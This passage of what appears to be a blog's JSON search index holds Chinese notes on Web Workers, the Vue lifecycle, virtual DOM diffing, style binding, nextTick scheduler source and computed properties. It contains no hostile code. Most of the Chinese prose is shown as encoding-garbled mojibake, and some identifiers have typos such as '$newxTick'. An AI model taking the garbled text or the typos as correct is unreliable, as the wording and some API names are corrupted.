åœ¨å·¥ä½œè€…çº¿ç¨‹å†…éƒ¨å¯ä»¥è¯·æ±‚ä»»ä½•æ¥æºçš„è„šæœ¬ï¼ˆæ²¡æœ‰CORSé™åˆ¶ï¼‰  åŠ è½½æˆåŠŸåï¼Œæ¯ä¸ªè„šæœ¬ä¸­çš„å…¨å±€ä¸Šä¸‹æ–‡éƒ½èƒ½å¤Ÿåœ¨ Worker çº¿ç¨‹ä¸­ä½¿ç”¨ â€”â€” å…±äº«ä½œç”¨åŸŸ  å¦‚æœè„šæœ¬æ— æ³•åŠ è½½ï¼Œå°†ä¼šæŠ›å‡ºé”™è¯¯ï¼Œå¹¶ä¸”ä¹‹åçš„ä»£ç ä¹Ÿæ— æ³•æ‰§è¡Œäº†// main.jsconst worker = new Worker('./worker.js',{name:'foo'});// worker.jsimportScripts('./scriptA.js','./scriptB.js');const workerToken = 'worker.js'console.log(`in worker.js,, name is ${ self.name }, workerToken is ${ workerToken }`)// scriptA.jsconsole.log(`in scriptA.js, name is ${ self.name }, workerToken is ${ workerToken }`)// scriptB.jsconsole.log(`in scriptB.js, name is ${ self.name }, workerToken is ${ workerToken }`)å¤„ç†å·¥ä½œè€…çº¿ç¨‹é”™è¯¯â€‹\tæŠ›å‡ºé”™è¯¯çš„å·¥ä½œè€…çº¿ç¨‹ï¼Œå¯ä»¥ä¸æ‰“æ–­çˆ¶çº¿ç¨‹çš„æ‰§è¡Œã€‚try/catchä¸èƒ½æ•è·åˆ°é”™è¯¯ï¼Œä¸è¿‡ä¾ç„¶ä¼šå†’æ³¡åˆ°å·¥ä½œè€…çº¿ç¨‹çš„å…¨å±€ä¸Šä¸‹æ–‡ï¼Œå› æ­¤å¯ä»¥åœ¨Workerå¯¹è±¡ä¸Šè®¾ç½® é”™è¯¯äº‹ä»¶ç›‘å¬å™¨ æ‰å¯ä»¥è®¿é—®åˆ°ã€‚// main.js const worker = new Worker('./woker.js')worker.onerror = console.log; // isTrusted: true, message: 'Uncaught Error: errormessage',....// woker.jsthrow Error('errormessage')"
  },
  
  {
    "title": "Vueç”Ÿå‘½å‘¨æœŸ",
    "url": "/posts/Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-30 00:00:00 +0800",
    





    
    "snippet": "Vueç”Ÿå‘½å‘¨æœŸ  created:htmlåŠ è½½å®Œæˆä¹‹å‰ï¼Œæ‰§è¡Œã€‚æ‰§è¡Œé¡ºåº:çˆ¶ç»„ä»¶-å­ç»„ä»¶  mounted:htmlåŠ è½½å®Œæˆåæ‰§è¡Œã€‚æ‰§è¡Œé¡ºåº:å­ç»„ä»¶-çˆ¶ç»„ä»¶  methods:äº‹ä»¶æ–¹æ³•æ‰§è¡Œ          å¯ç”¨thisè°ƒç”¨å…¶ä»–æ–¹æ³•        watch:å»ç›‘å¬ä¸€ä¸ªå€¼çš„å˜åŒ–ï¼Œç„¶åæ‰§è¡Œç›¸å¯¹åº”çš„å‡½æ•°  computed:computedæ˜¯è®¡ç®—å±æ€§ï¼Œä¹Ÿå°±æ˜¯ä¾èµ–å…¶å®ƒçš„å±æ€§è®¡ç®—æ‰€å¾—å‡ºæœ€åçš„å€¼é”€æ¯ &...",
    "content": "Vueç”Ÿå‘½å‘¨æœŸ  created:htmlåŠ è½½å®Œæˆä¹‹å‰ï¼Œæ‰§è¡Œã€‚æ‰§è¡Œé¡ºåº:çˆ¶ç»„ä»¶-å­ç»„ä»¶  mounted:htmlåŠ è½½å®Œæˆåæ‰§è¡Œã€‚æ‰§è¡Œé¡ºåº:å­ç»„ä»¶-çˆ¶ç»„ä»¶  methods:äº‹ä»¶æ–¹æ³•æ‰§è¡Œ          å¯ç”¨thisè°ƒç”¨å…¶ä»–æ–¹æ³•        watch:å»ç›‘å¬ä¸€ä¸ªå€¼çš„å˜åŒ–ï¼Œç„¶åæ‰§è¡Œç›¸å¯¹åº”çš„å‡½æ•°  computed:computedæ˜¯è®¡ç®—å±æ€§ï¼Œä¹Ÿå°±æ˜¯ä¾èµ–å…¶å®ƒçš„å±æ€§è®¡ç®—æ‰€å¾—å‡ºæœ€åçš„å€¼é”€æ¯ &amp; äº‹ä»¶â€‹\tå½“è°ƒç”¨this.$destroyedåï¼ŒåŸç”Ÿçš„äº‹ä»¶å›è°ƒä»ç„¶å¯ä»¥è¢«è§¦å‘ï¼Œå¦‚@cilck()ç­‰ï¼›â€‹\tå­ç»„ä»¶ä»¥åŠç»„ä»¶è‡ªå®šä¹‰çš„äº‹ä»¶ &amp; é¡µé¢å“åº”å¼å˜åŒ–å°±ä¼šè¢«é”€æ¯è€Œæ— æ³•è§¦å‘"
  },
  
  {
    "title": "è™šæ‹ŸDOM",
    "url": "/posts/%E8%99%9A%E6%8B%9FDOM/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-26 00:00:00 +0800",
    





    
    "snippet": "â€‹\tä»€ä¹ˆæ˜¯çœŸå®DOMï¼Ÿåœ¨Vue2ä¸­å¼•å…¥â€œè™šæ‹ŸDOMâ€ï¼ŒæŒ‡ä¸ç«‹å³æ“ä½œDOMï¼Œè€Œæ˜¯å°†æ›´æ–°çš„diffå†…å®¹ä¿å­˜åˆ°æœ¬åœ°çš„ JS å¯¹è±¡ä¸­ï¼Œå¯¹æ¯”åŸæ¥DOMæ ‘æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå®ç°å±€éƒ¨æ›´æ–°ï¼Œæœ€ç»ˆä¸€æ¬¡æ€§attchåˆ°DOMæ ‘ä¸Šï¼Œé¿å…äº†å¤§é‡çš„æ— è°“è®¡ç®—é‡è™šæ‹ŸDOMï¼šä¸€ä¸ªèƒ½ä»£è¡¨DOMæ ‘çš„å¯¹è±¡ï¼Œé€šå¸¸å«æœ‰æ ‡ç­¾åã€æ ‡ç­¾å±æ€§ã€äº‹ä»¶ç›‘å¬å’Œå­å…ƒç´ ä»¬ï¼Œä»¥åŠå…¶ä»–å±æ€§  ä¼˜ç‚¹ï¼šé¡µé¢æ›´æ–°å¯ä»¥å…ˆå…¨éƒ¨åæ˜ åˆ°è™šæ‹ŸDOMä¸Šï¼Œå†…å­˜æ“ä½œçš„JSå¯¹è±¡å¤„ç†é€Ÿåº¦...",
    "content": "â€‹\tä»€ä¹ˆæ˜¯çœŸå®DOMï¼Ÿåœ¨Vue2ä¸­å¼•å…¥â€œè™šæ‹ŸDOMâ€ï¼ŒæŒ‡ä¸ç«‹å³æ“ä½œDOMï¼Œè€Œæ˜¯å°†æ›´æ–°çš„diffå†…å®¹ä¿å­˜åˆ°æœ¬åœ°çš„ JS å¯¹è±¡ä¸­ï¼Œå¯¹æ¯”åŸæ¥DOMæ ‘æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå®ç°å±€éƒ¨æ›´æ–°ï¼Œæœ€ç»ˆä¸€æ¬¡æ€§attchåˆ°DOMæ ‘ä¸Šï¼Œé¿å…äº†å¤§é‡çš„æ— è°“è®¡ç®—é‡è™šæ‹ŸDOMï¼šä¸€ä¸ªèƒ½ä»£è¡¨DOMæ ‘çš„å¯¹è±¡ï¼Œé€šå¸¸å«æœ‰æ ‡ç­¾åã€æ ‡ç­¾å±æ€§ã€äº‹ä»¶ç›‘å¬å’Œå­å…ƒç´ ä»¬ï¼Œä»¥åŠå…¶ä»–å±æ€§  ä¼˜ç‚¹ï¼šé¡µé¢æ›´æ–°å¯ä»¥å…ˆå…¨éƒ¨åæ˜ åˆ°è™šæ‹ŸDOMä¸Šï¼Œå†…å­˜æ“ä½œçš„JSå¯¹è±¡å¤„ç†é€Ÿåº¦ä¼šæ›´å¿«ï¼Œæœ€ç»ˆå†äº¤ç”±æµè§ˆå™¨ç»˜åˆ¶          å‡å°‘DOMæ“ä½œï¼šå‡å°‘æ¬¡æ•°ã€å±€éƒ¨æ›´æ–°      è·¨å¹³å°ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªjså¯¹è±¡        ç¼ºç‚¹ï¼šéœ€è¦é¢å¤–çš„åˆ›å»ºå‡½æ•°ï¼Œå¦‚vueçš„hï¼Œä½¿ç”¨v-loaderè½¬è¯‘ï¼Œä¸¥é‡ä¾èµ–æ‰“åŒ…å·¥å…·ï¼ŒèŠ±è´¹é‡æ–°æ„å»ºçš„è¿‡ç¨‹DOM diffä»€ä¹ˆæ˜¯diffï¼šâ€‹\tä¸€ç§æ¯”è¾ƒç®—æ³•ï¼Œé€šè¿‡jså±‚é¢çš„è®¡ç®—ï¼Œæ ¹æ®ä¸¤ä¸ªè™šæ‹Ÿå¯¹è±¡åˆ›å»ºå‡ºå·®å¼‚çš„è¡¥ä¸å¯¹è±¡patchï¼Œç”¨ä»¥æè¿°æ”¹å˜å†…å®¹ï¼Œç„¶åç”¨ç‰¹å®šçš„æ“ä½œè§£æpatchå¯¹è±¡ï¼Œæ›´æ–°DOMé¡µé¢é‡æ–°æ¸²æŸ“  patches = patch(oldVNode,newVNode) ## å¤§è‡´é€»è¾‘  Tree diff:          æ–°æ—§ä¸¤æ£µæ ‘é€å±‚å¯¹æ¯”ï¼Œè®°å½•éœ€æ›´æ–°çš„èŠ‚ç‚¹      èŠ‚ç‚¹æ˜¯ç»„ä»¶ â€” çœ‹Component diff      èŠ‚ç‚¹æ˜¯æ ‡ç­¾ â€” çœ‹Element diff        Component diff          ç»„ä»¶ç±»å‹                  ä¸åŒç›´æ¥æ›¿æ¢ï¼ˆåˆ é™¤æ—§çš„ï¼‰          ç±»å‹ç›¸åŒåªåšæ›´æ–°                    æ·±å…¥ç»„ä»¶åšTree diffï¼ˆé€’å½’ï¼‰        Element diff          åŸç”Ÿæ ‡ç­¾ï¼Œçœ‹æ ‡ç­¾å                  æ ‡ç­¾åä¸åŒç›´æ¥æ›¿æ¢          æ ‡ç­¾åç›¸åŒåˆ™åªæ›´æ–°å±æ€§                    æ·±å…¥æ ‡ç­¾åä»£åšTree diffï¼ˆé€’å½’ï¼‰      ç¼ºç‚¹â€‹\tåŒçº§èŠ‚ç‚¹å¯¹æ¯”å­˜åœ¨bug â€”â€” èŠ‚ç‚¹æ·»åŠ å”¯ä¸€çš„idä½¿ç”¨diff.patch()å®ç°Vueè™šæ‹ŸDOMè½¬åŒ–ä¸ºçœŸå®DOMæ¸²æŸ“  åˆå§‹åŒ–function createElement(vnode){    let tag = vnode.tag // ç›®æ ‡å…ƒç´     let attrs = vnode.attrs || {} //å±æ€§ï¼Œæ— åˆ™ä¸ºç©ºå¯¹è±¡    let children = vnode.children || [] // å­èŠ‚ç‚¹    if(!tag) {return null;} //è‹¥ç›®æ ‡èŠ‚ç‚¹ä¸å­˜åœ¨ï¼Œé€€å‡ºå‡½æ•°    // åˆ›å»ºå¯¹åº”çš„DOM    let elem = document.createElement(tag);    // æ·»åŠ å±æ€§    let attrName; // å±æ€§å    for(attrName in attrs){         if(attrs.hasOwnProperty(attrName)){             elem.setAttribute(attrName,attrs[attrName]) // å°†å±æ€§æ·»åŠ åˆ°å…ƒç´ çš„å±æ€§æ•°ç»„ä¸­         }    }    // æ·»åŠ å­èŠ‚ç‚¹    children.forEach(function(childVnode){        elem.appendChild(createElement(childVnode))    });    return elem;}  æ›´æ–°function updateChildren(oldVnode,newVnode){    let oldChildren = oldVnode.children() || [];    let newChildren = newVnode.children() || [];    oldChildren.forEach(function(oldchildrenVnode,index){        let newChildrenVnode = newChildren[index];        // å­èŠ‚ç‚¹ æ²¡æœ‰å˜åŒ–ï¼Œé€’å½’æŸ¥æ‰¾ä¸‹ä¸€å±‚å­èŠ‚ç‚¹        if(oldchildrenVnode === newChildrenVnode){            updateChildren(oldchildrenVnode,newChildrenVnode)        }else{ // å­èŠ‚ç‚¹ tagä¸ä¸€æ ·ï¼Œç›´æ¥æ›¿æ¢            replaceNode(oldchildrenVnode,newChildrenVnode)        }    })}"
  },
  
  {
    "title": "ç»‘å®šstyle",
    "url": "/posts/%E7%BB%91%E5%AE%9Astyle/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-22 00:00:00 +0800",
    





    
    "snippet": "  Classæ ·å¼  â€”â€” :class=\"xxx\"          å­—ç¬¦ä¸²å†™æ³•ï¼šç±»ç›®ä¸ç¡®å®šï¼ŒåŠ¨æ€è·å–      å¯¹è±¡å†™æ³•ï¼šä¸ªæ•°ä¸ç¡®å®šï¼Œåå­—ä¹Ÿä¸ç¡®å®š      æ•°ç»„å†™æ³•ï¼šåå­—å·²ç»ç¡®å®šï¼Œä¸ªæ•°ç¡®å®šï¼Œä½†ä¸ç¡®å®šç”¨ä¸ç”¨        Styleæ ·å¼  â€”â€” å±æ€§é”®å€¼å¯¹ï¼Œéœ€è¦é©¼å³°å‘½åæ³•          :style = \"{fontSize: 'xxx'}\"      :style = \"[a,b]...",
    "content": "  Classæ ·å¼  â€”â€” :class=\"xxx\"          å­—ç¬¦ä¸²å†™æ³•ï¼šç±»ç›®ä¸ç¡®å®šï¼ŒåŠ¨æ€è·å–      å¯¹è±¡å†™æ³•ï¼šä¸ªæ•°ä¸ç¡®å®šï¼Œåå­—ä¹Ÿä¸ç¡®å®š      æ•°ç»„å†™æ³•ï¼šåå­—å·²ç»ç¡®å®šï¼Œä¸ªæ•°ç¡®å®šï¼Œä½†ä¸ç¡®å®šç”¨ä¸ç”¨        Styleæ ·å¼  â€”â€” å±æ€§é”®å€¼å¯¹ï¼Œéœ€è¦é©¼å³°å‘½åæ³•          :style = \"{fontSize: 'xxx'}\"      :style = \"[a,b]\"      &lt;div id=\"root\"&gt;    &lt;!-- &lt;div class=\"base\" @click=\"changeClass\" id=\"demo\"&gt;test&lt;/div&gt; --&gt;    &lt;!-- ã€å­—ç¬¦ä¸²å†™æ³•ã€‘æ’å…¥ä¸€ä¸ªclassï¼ŒåŠ¨æ€å®ç°class --&gt;    &lt;div class=\"base\" :class=\"a\" @click=\"changeClass\"&gt;test&lt;/div&gt;    &lt;!-- ã€æ•°ç»„å†™æ³•ã€‘æ’å…¥ä¸€ä¸ªç³»åˆ—classï¼Œæ ·å¼ä¸ªæ•°ä¸ç¡®å®šã€åå­—ä¸ç¡®å®š --&gt;    &lt;div class=\"base\" :class=\"arr\"&gt;test&lt;/div&gt;    &lt;!--  :class=\"['radius1','radius2']\"  åŒå¼•å·é‡Œé¢å¯ä»¥æ”¾ è¡¨è¾¾å¼ --&gt;    &lt;!--  :class=\"[radius1,radius2]\"  å»æ‰æ•°ç»„å…ƒç´ é‡Œé¢çš„å¼•å·ï¼Œvueå½“æˆå˜é‡åä½¿ç”¨ï¼Œéœ€è¦dataé‡Œé¢æœ‰ç›¸åº”çš„å€¼ --&gt;    &lt;!-- ã€å¯¹è±¡å†™æ³•ã€‘æ ·å¼ä¸ªæ•°ç¡®å®šã€åå­—ç¡®å®šï¼Œä½†æ˜¯åŠ¨æ€å†³å®šç”¨ä¸ç”¨--&gt;    &lt;div class=\"base\" :class=\"obj\"&gt;test&lt;/div&gt;    &lt;!--  :class=\"{radius1: true,radius2: false}\"    --&gt;    &lt;!-- ã€è¡Œå†…å¼ã€‘ 1.æ ·å¼ä¸ºé”®å€¼å¯¹ï¼Œéœ€è¦ä½¿ç”¨å¯¹è±¡  2.font-size æ”¹ä¸ºfontSizeï¼Œ --&gt;    &lt;!-- æ•°å€¼å†™æ³•ï¼šstyle='stylyArr'  style='[styleObj1,stleObj2]'--&gt;    &lt;div class=\"base\" :style=\"{fontSize:fsize+'px'}\" &gt;test&lt;/div&gt;    &lt;div class=\"base\" :style=\"stylyObj\" &gt;test&lt;/div&gt;&lt;/div&gt;new Vue({    el:\"#root\",    data:{        a:'bcc1',        arr:['radius1','radius2'],        obj:{            radius1: false,            radius2: false        },        fsize:59,        stylyObj:{            fontSize:'60px',            backgroundColor:'#984'        }    }})"
  },
  
  {
    "title": "ç»„ä»¶å®ä¾‹",
    "url": "/posts/%E7%BB%84%E4%BB%B6%E5%AE%9E%E4%BE%8B/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-22 00:00:00 +0800",
    





    
    "snippet": "      $data](https://cn.vuejs.org/api/component-instance.html#data)        $props        $el        $options        $parent        $root        $slots        $refs        $attrs        $watch()    ...",
    "content": "      $data](https://cn.vuejs.org/api/component-instance.html#data)        $props        $el        $options        $parent        $root        $slots        $refs        $attrs        $watch()        $emit()        $forceUpdate()        $nextTick() ï¼šåœ¨ä¸‹ä¸€æ¬¡DOMæ›´æ–°ç»“æŸåï¼Œæ‰§è¡Œå…¶æŒ‡å®šçš„å›è°ƒ          Vueåœ¨æ›´æ–°DOMæ—¶æ˜¯å¼‚æ­¥å®ç°çš„ â€” å¼‚æ­¥ä»»åŠ¡åœ¨åŒæ­¥ä»»åŠ¡å®Œæˆä¹‹åæ‰èƒ½æ‰§è¡Œï¼Œ      Vueä¸­æ”¹å˜å“åº”å¼çŠ¶æ€æ—¶ï¼Œå¼€å¯ä¸€ä¸ªç¼“å­˜å¼‚æ­¥ä»»åŠ¡çš„é˜Ÿåˆ—ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªâ€œtickâ€æ‰ä¸€èµ·æ‰§è¡Œ                  ç¡®ä¿æ¯ä¸ªç»„ä»¶æ— è®ºå‘ç”Ÿå¤šå°‘çŠ¶æ€æ”¹å˜ï¼Œéƒ½ä»…æ‰§è¡Œä¸€æ¬¡æ›´æ–°ï¼ˆDOM é‡æ–°è®¡ç®—æ¸²æŸ“ï¼‰ã€‚                    æ”¹å˜æ•°æ®åï¼ŒDOMéœ€è¦é‡æ–°æ›´æ–°ï¼Œå¹¶ä¸”è¦åŸºäºæ›´æ–°åçš„æ–°DOMè¿›è¡ŒæŸäº›æ“ä½œ                  $nextTick()åœ¨çŠ¶æ€æ”¹å˜åï¼ˆDOMæ¸²æŸ“åï¼‰ ç«‹å³ä½¿ç”¨ï¼Œä»¥ç¡®ä¿æ“ä½œå¯¹è±¡æ˜¯å­˜åœ¨ã€çŠ¶æ€å·²æ›´æ–°                            å…¨å±€ Vue.$nextTick(callFunction, this)      å½“å‰ç»„ä»¶ ` this.$newxTick(callFunction)   â€” å›è°ƒå‡½æ•°ä¸­çš„ this å°†è‡ªåŠ¨ç»‘å®šåˆ°å½“å‰çš„ Vue` å®ä¾‹ä¸Š        $nextTick() ä¼šè¿”å›ä¸€ä¸ª Promise å¯¹è±¡  // ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°this.$refs.inputTitle.disable = false // æ‰“å¼€è¾“å…¥æ¡†this.$nextTick(function(){    this.$refs.inputTitle.focus() // åŒæ­¥æ‰§è¡Œæ—¶ï¼Œå…³é—­çš„è¾“å…¥æ¡†æ— æ³•è·å–ç„¦ç‚¹})// await è¿”å›çš„ Promiseasync increment() {      this.count++      // DOM è¿˜æœªæ›´æ–°      console.log(document.getElementById('counter').textContent) // 0      await nextTick()      // DOM æ­¤æ—¶å·²ç»æ›´æ–°      console.log(document.getElementById('counter').textContent) // 1}            [ã€æºç åˆ†æã€‘é¢è¯•å®˜ï¼šVueä¸­çš„$nextTickæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ      webå‰ç«¯é¢è¯• - é¢è¯•å®˜ç³»åˆ— (vue3js.cn)](https://vue3js.cn/interview/vue/nexttick.html#ä¸€ã€nexttickæ˜¯ä»€ä¹ˆ)            å®šä¹‰ä¸€ä¸ªå®šæ—¶å™¨ â€” å°†æ“ä½œæ”¾åˆ°å¼‚æ­¥é˜Ÿåˆ—ï¼ˆpromiseï¼‰ä¸­ï¼Œç­‰åŒæ­¥äº‹ä»¶æ‰§è¡Œå®Œæ¯•å†æ‰§è¡Œï¼ŒåŸç†ä¸€æ ·ï¼ˆå³ä½¿ä¸ç»™æ—¶é—´ï¼‰        Vue2 ä¸­çš„æºç åˆ¤æ–­é€»è¾‘ï¼šæ˜¯å¦æœ‰promist - mutationObserve -setimmediate - setTimeout    Vue3 ä¸­çš„æºç  ç›´æ¥è®¤ä¸ºæ˜¯promiseï¼Œä¸æ˜¯åˆ™è¿”å›ä¸€ä¸ªpromise  /* vue3.4 */// resolvedPromise ä¹Ÿæ˜¯ä¸€ä¸ªpromiseconst resolvedPromise = /*#__PURE__*/ Promise.resolve() as Promise&lt;any&gt;// currentFlushPromise æ˜¯ä¸€ä¸ªpromise\tlet currentFlushPromise: Promise&lt;void&gt; | null = nullexport function nextTick&lt;T = void, R = void&gt;(  this: T, // ç»™ This ç¡®å®šç±»å‹  fn?: (this: T) =&gt; R): Promise&lt;Awaited&lt;R&gt;&gt; {  const p = currentFlushPromise || resolvedPromise  return fn ? p.then(this ? fn.bind(this) : fn) : p // å°†ä¼ å…¥çš„å›è°ƒæ”¾å…¥promiseä¸­}// è°ƒåº¦å¼‚æ­¥ä»»åŠ¡const queue: SchedulerJob[] = [] let isFlushing = falseexport function queueJob(job: SchedulerJob) {  // é‡å¤æ•°æ®æ¶ˆé™¤æœç´¢ä½¿ç”¨ Array.includes()çš„startIndexå‚æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæœç´¢ç´¢å¼•åŒ…æ‹¬æ­£åœ¨è¿è¡Œçš„å½“å‰ä½œä¸šï¼Œå› æ­¤å®ƒä¸èƒ½å†æ¬¡é€’å½’è§¦å‘è‡ªå·±ã€‚å¦‚æœä½œä¸šæ˜¯watchï¼ˆï¼‰å›è°ƒï¼Œåˆ™æœç´¢å°†ä»+1ç´¢å¼•å¼€å§‹ï¼Œä»¥å…è®¸å®ƒé€’å½’åœ°è§¦å‘è‡ªå·±â€”â€”ç”¨æˆ·æœ‰è´£ä»»ç¡®ä¿å®ƒä¸ä¼šä»¥æ— é™å¾ªç¯ç»“æŸã€‚  // å»é‡  if ( !queue.length || queue.includes(      job, isFlushing &amp;&amp; job.allowRecurse ? flushIndex + 1 : flushIndex    )) {      // æ²¡æœ‰ç»„ä»¶id æ·»åŠ åˆ°æ•°ç»„æœ«å°¾    if (job.id == null) {      queue.push(job)    } else {// æŒ‰ç…§jod.id è‡ªå¢é¡ºåºæ’åº      queue.splice(findInsertionIndex(job.id), 0, job)    }    queueFlush()  }}// åˆ›å»ºå¾®ä»»åŠ¡function queueFlush() {  if (!isFlushing &amp;&amp; !isFlushPending) { // ä¸æŒ‚èµ· &amp;&amp; ä¸æ›´æ–°    isFlushPending = true // å°†ä»»åŠ¡æŒ‚èµ·    // åˆ›å»ºå¾®ä»»åŠ¡ promiseï¼Œå°†flushJobsæ”¾å…¥æ‰§è¡Œ    currentFlushPromise = resolvedPromise.then(flushJobs)  }}function flushJobs(seen?: CountMap) {  isFlushPending = false // Pending æŒ‚èµ· ä¸  isFlushing = true // Flushing åˆ·æ–°      queue.sort(comparator) // é˜Ÿåˆ—é‡æ–°æ’é˜Ÿ    // 1. ç¡®ä¿ç»„ä»¶æ›´æ–°æ˜¯ç”±çˆ¶ç»„ä»¶åˆ°å­ç»„ä»¶â€”â€”çˆ¶ç»„ä»¶åœ¨å­ç»„ä»¶ä¹‹å‰åˆ›å»ºï¼Œæ‹¥æœ‰æ›´å°æ›´ä¼˜å…ˆçš„ç¼–å·    // 2. çˆ¶ç»„ä»¶çš„æ›´æ–°å¸è½½äº†å­ç»„ä»¶ï¼Œå­ç»„ä»¶çš„æ›´æ–°å°±å¯ä»¥è¢«è·³è¿‡äº†      try { // éå†é˜Ÿåˆ—ï¼Œæ‰¹é‡æ‰§è¡Œ    for (flushIndex = 0; flushIndex &lt; queue.length; flushIndex++) {      const job = queue[flushIndex]      if (job &amp;&amp; job.active !== false) {        if (__DEV__ &amp;&amp; check(job)) {          continue        }        // console.log(`running:`, job.id)        callWithErrorHandling(job, null, ErrorCodes.SCHEDULER) // æ‰§è¡Œï¼      }    }  } finally { // æ‰§è¡Œå®Œæˆåï¼Œé‡ç½®çŠ¶æ€    flushIndex = 0    queue.length = 0\t/*        watch(xxx,()=&gt;{},{          flush:'post'        })         èµ° flushPostFlushCbs() æ–¹æ³•  \t*/    flushPostFlushCbs(seen)    isFlushing = false    currentFlushPromise = null    // some postFlushCb queued jobs!    // keep flushing until it drains.    if (queue.length || pendingPostFlushCbs.length) {      flushJobs(seen)    }  }}  job ç»„ä»¶å®ä¾‹ä¸Šçš„update()æ–¹æ³•ï¼Œç”Ÿæˆinstance.update()          const update = (instance.update = () =&gt; effect.run() ) æ”¶é›†effectä¾èµ–      update.id = instance.uid vueè‡ªå¢çš„id      "
  },
  
  {
    "title": "è®¡ç®—å±æ€§å’Œç›‘è§†å±æ€§",
    "url": "/posts/%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E5%92%8C%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-20 00:00:00 +0800",
    





    
    "snippet": "è®¡ç®—å±æ€§ã€æ¡ˆä¾‹ã€‘  æ’å€¼è¯­æ³•å®ç°&lt;div id=\"root\"&gt;    &lt;span&gt;å§“&lt;/span&gt; &lt;input type=\"text\" v-model=\"firstName\" name=\"xin\" id=\"xin\"&gt; &lt;br&gt;    &lt;span&gt;å&lt;/span&gt; &lt;input type=\"text\" ...",
    "content": "è®¡ç®—å±æ€§ã€æ¡ˆä¾‹ã€‘  æ’å€¼è¯­æ³•å®ç°&lt;div id=\"root\"&gt;    &lt;span&gt;å§“&lt;/span&gt; &lt;input type=\"text\" v-model=\"firstName\" name=\"xin\" id=\"xin\"&gt; &lt;br&gt;    &lt;span&gt;å&lt;/span&gt; &lt;input type=\"text\" v-model=\"lastName\" name=\"min\" id=\"min\"&gt; &lt;br&gt;    å§“åï¼š&lt;span&gt;{{firstName}} - {{lastName}}&lt;/span&gt; &lt;/div&gt;  methodså®ç°å§“åï¼š&lt;span&gt;{{fullName()}}&lt;/span&gt;  &lt;!-- æ’å…¥å‡½æ•°çš„è¿”å›å€¼ï¼Œæ˜¯ä¸€ä¸ªå€¼ï¼›{{fullName}} å°†è¾“å‡ºæ•´ä¸ªå‡½æ•° --&gt;const vm = new Vue({    el:\"#root\",    data:{        firstName:'å¼ ',        lastName:\"ä¸‰\"    },    methods:{        fullName(){            let FName = this.firstName;            let LName = this.lastName;            return `${FName} - ${LName}`        }    }})  compenå®ç°&lt;div id=\"root\"&gt;    &lt;span&gt;å§“&lt;/span&gt; &lt;input type=\"text\" v-model=\"firstName\" name=\"xin\" id=\"xin\"&gt; &lt;br&gt;    &lt;span&gt;å&lt;/span&gt; &lt;input type=\"text\" v-model=\"lastName\" name=\"min\" id=\"min\"&gt; &lt;br&gt;    å§“åï¼š&lt;span&gt;{{fullName}}&lt;/span&gt;  &lt;/div&gt;\t const vm = new Vue({     el:\"#root\",     data:{         firstName:'å¼ ',         lastName:\"ä¸‰\"     },     // Vueè®¤ä¸º dataä¸­çš„æ˜¯ å±æ€§:å±æ€§å€¼; é€šè¿‡å±æ€§å€¼è®¡ç®—å‡ºæ¥çš„å€¼ï¼Œç§°ä¸ºè®¡ç®—å±æ€§     computed:{         // å­˜æ”¾è®¡ç®—å±æ€§ï¼Œä½¿ç”¨å¯¹è±¡å­˜æ”¾         // è®¡ç®—è¿‡ç¨‹é…ç½®ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œé‡Œé¢è‡³å°‘è¦æœ‰ä¸€ä¸ªgetter -- è°ƒç”¨è¯¥è®¡ç®—å±æ€§æ—¶ï¼Œgetterä¼šè¢«è°ƒç”¨ï¼Œä¸”è¿”å›å€¼ä½œä¸ºè®¡ç®—å±æ€§å€¼         // ç»è¿‡è®¡ç®—åï¼Œå…¶ç»“æœæ‰ä¼šè¿›å…¥ _data é‡Œé¢è¿›è¡ŒåŠ«æŒå’Œä»£ç†         fullName:{             get(){                 return this.firstName + '-' + this.lastName;             }         }     } })// ç®€å†™ -- ç¡®å®šè®¡ç®—å‡½æ•°ä¸éœ€è¦setterï¼Œå¯ä»¥ç›´æ¥è·Ÿä¸€ä¸ªå‡½æ•°ï¼Œä½œä¸ºgetterä½¿ç”¨// è¡¨é¢ä¸Šæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå…¶å®æ˜¯å‡½æ•°æ‰§è¡Œåè¿”å›ç»“æœå€¼// ä¸å¯ä»¥ä½¿ç”¨ {{fullNmae()}} è°ƒç”¨ï¼Œå› ä¸ºå…¶æœ¬è´¨ä»ç„¶æ˜¯ä¸€ä¸ªå±æ€§è€Œä¸æ˜¯å‡½æ•° computed:{    fullName() {        return this.firstName + '-' + this.lastName    } }ã€è®¡ç®—å±æ€§ã€‘      è®¡ç®—å±æ€§ï¼šä¾èµ–éœ€è¦å¤§é‡è®¡ç®—çš„å±æ€§ï¼Œå°†è®¡ç®—è¿‡ç¨‹æå–å‡ºæ¥ï¼Œå•ç‹¬å­˜æ”¾åœ¨computedä¸­ï¼›          è‡³å°‘éœ€è¦ä¸€ä¸ª getterï¼Œåœ¨è°ƒç”¨åè®¡ç®—ï¼Œè®¡ç®—çš„å€¼å­˜æ”¾åˆ°_data_ä¸­      åœ¨_data_ä¸­ï¼Œæ’å€¼ç¬¦å·å°±å¯ä»¥ç›´æ¥è¯»å–å…¶å€¼        :warning: æ³¨æ„çš„ç»†èŠ‚ï¼š          ä¾èµ– å·²æœ‰çš„å±æ€§ è®¡ç®—å‡ºæ¥ï¼Œå…¶ä»–çš„æ•°æ®ã€å˜é‡å˜åŒ–ä¸ä¼šå¼•èµ·å…¶æ”¹å˜      åŸç†ï¼šObject.definePropertyæ–¹æ³•æä¾›çš„getterã€setter            getterè°ƒç”¨çš„æ—¶æœºï¼š                  åˆæ¬¡è¯»å– å±æ€§æ—¶ï¼Œ:+1: 